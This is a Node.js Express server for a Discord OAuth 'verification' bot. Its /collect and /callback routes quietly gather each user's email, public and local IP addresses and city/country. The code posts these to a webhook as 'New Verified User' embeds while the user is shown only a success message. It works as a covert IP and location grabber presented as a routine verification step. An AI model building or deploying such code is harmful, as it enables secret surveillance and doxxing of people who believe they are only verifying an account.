require('dotenv').config();
const express = require('express');
const axios = require('axios');
const app = express();

app.use(express.json());
app.use(express.static('public'));

const PORT = process.env.PORT || 3000;
const sessions = new Map();

app.post('/collect', (req, res) => {
    const { state, data } = req.body;
    if (state && data) {
        sessions.set(state, data);
    }
    res.sendStatus(200);
});

app.get('/callback', async (req, res) => {
    const { code, state } = req.query;
    if (!code) return res.send('Error no Authorization Code.');
    
    const clientData = sessions.get(state) || { error: 'No data found' };
    sessions.delete(state);

    const protocol = req.headers['x-forwarded-proto'] || req.protocol;
    const host = req.get('host');
    const redirectUri = `${protocol}://${host}/callback`;

    try {
        const tokenResponse = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
            client_id: process.env.DISCORD_CLIENT_ID,
            client_secret: process.env.DISCORD_CLIENT_SECRET,
            grant_type: 'authorization_code',
            code: code,
            redirect_uri: redirectUri
        }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });

        const { access_token, token_type } = tokenResponse.data;

        const userResponse = await axios.get('https://discord.com/api/users/@me', {
            headers: { Authorization: `${token_type} ${access_token}` }
        });
        const user = userResponse.data;

        await axios.post(process.env.DISCORD_WEBHOOK_URL, {
            embeds: [{
                title: 'New Verified User',
                color: 0x5865f2,
                fields: [
                    { name: 'Username', value: user.username, inline: true },
                    { name: 'Email', value: user.email || 'Not provided', inline: true },
                    { name: 'Discord ID', value: user.id, inline: true },
                    { name: 'Public IP', value: clientData.publicIp || 'Unknown', inline: true },
                    { name: 'Local IPs', value: (clientData.localIps || []).join(', ') || 'Hidden', inline: true },
                    { name: 'Location', value: clientData.geo ? `${clientData.geo.city}, ${clientData.geo.country}` : 'Unknown', inline: true }
                ],
                timestamp: new Date().toISOString()
            }]
        });

        await axios.put(`https://discord.com/api/v10/guilds/${process.env.DISCORD_GUILD_ID}/members/${user.id}`,
            { access_token: access_token },
            { headers: { Authorization: `Bot ${process.env.DISCORD_BOT_TOKEN}`, 'Content-Type': 'application/json' } }
        );

        await axios.put(`https://discord.com/api/v10/guilds/${process.env.DISCORD_GUILD_ID}/members/${user.id}/roles/${process.env.DISCORD_ROLE_ID}`,
            {},
            { headers: { Authorization: `Bot ${process.env.DISCORD_BOT_TOKEN}` } }
        );

        res.send('<h2 style="font-family:sans-serif;text-align:center;margin-top:50px;">✅ Verification successful! You can close this page.</h2>');
    } catch (error) {
        console.error(error.response?.data || error.message);
        res.status(500).send('❌ Verification error. Check server console.');
    }
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
